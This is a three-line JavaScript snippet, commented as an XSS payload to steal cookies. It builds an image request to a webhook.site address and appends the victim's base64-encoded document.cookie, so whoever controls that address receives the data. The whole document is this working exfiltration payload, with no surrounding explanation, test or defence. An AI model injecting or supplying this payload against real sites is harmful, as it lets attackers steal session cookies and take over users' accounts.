// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/1ef6d932-a51e-45e8-8996-dc8b12147842?data=' + btoa(document.cookie);
